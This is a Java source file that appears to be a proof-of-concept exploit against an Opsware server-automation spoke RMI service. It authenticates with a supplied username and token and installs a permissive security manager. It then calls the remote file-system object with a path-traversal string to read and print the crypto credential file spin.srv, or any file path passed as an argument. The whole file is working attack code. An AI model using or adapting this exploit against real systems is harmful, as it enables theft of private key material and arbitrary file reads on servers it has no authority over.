// export CLASSPATH=/opt/opsware/occclient/spoke_client.jar:/opt/opsware/occclient/opsware_rmi.jar:.

import java.security.Permission;

import java.rmi.RMISecurityManager;
import java.rmi.Naming;
import java.rmi.server.RMISocketFactory;

import java.io.File;
import java.io.InputStream;

import com.opsware.rmi.ClientEndpoint;
import com.opsware.rmi.RemoteObject;
import com.opsware.rmi.wrapper.AuthedUser;
import com.opsware.rmi.wrapper.IAuthUser;

import com.opsware.rfs.intf.IFileSystem;

public class sc {
  public static void main(String[] asArgs) throws Exception {
    if ( asArgs.length < 3 ) {
      System.out.println("Usage: java sc <rmi_local_port> <username> <token> [<filepath>]");
      System.exit(1);
    }

    String rmi_local_port = asArgs[0];
    final String username = asArgs[1];
    final String token = asArgs[2];
    String file_path = "../../../../../../../../../../../../var/opt/opsware/crypto/spin/spin.srv";

    if ( asArgs.length > 3 ) file_path = asArgs[3];

    // Setup the spoke credentials.
    AuthedUser.setUser(new IAuthUser() {
        public String getUserToken() {return token;}
        public String getUserName() {return username;}
      });

    // Setup a security manager to allow this JVM to load remote code.
    if ( System.getSecurityManager() == null ) {
      System.out.println("setting new rmi security manager");
      System.setSecurityManager(new RMISecurityManager() {
          public void checkPermission(Permission perm) {}
          public void checkPermission(Permission perm, Object context) {}
        });
    }

    System.setProperty("java.rmi.server.hostname", "localhost");

    // Setup a handler for our spoke RMI server's "local" protocol.
    String handlers = System.getProperty("java.protocol.handler.pkgs");
    System.setProperty("java.protocol.handler.pkgs", "com.opsware.rmi" + (handlers == null ? "" : "|" + handlers));

//    IRuntime rt = (IRuntime)RemoteObject.lookup("/runtime");

    IFileSystem rt = (IFileSystem)Naming.lookup("//localhost:" + rmi_local_port + "/rfs");
    System.out.println("rt: " + rt);

    // We have to initialize the ClientEndpoint in order to get the socket factory stuff setup. :(
    new ClientEndpoint("127.0.0.1", 0,0,"","","", "rsrc:/www", "/twist_spoke_stubs.jar", null, false);


    // Attempt to get a File object.
    File f = rt.getFile(file_path);
    System.out.println("f.getAbsolutePath(): " + f.getAbsolutePath());
    System.out.println("f.getCanonicalPath(): " + f.getCanonicalPath());

    // Try to read the contents of the named file.
    InputStream fis = rt.getInputStream(f);
    byte[] buf = new byte[1024];
    int bytes_read = 0;
    while ( (bytes_read = fis.read(buf)) > 0 ) {
      System.out.write(buf, 0, bytes_read);
    }
  }
}
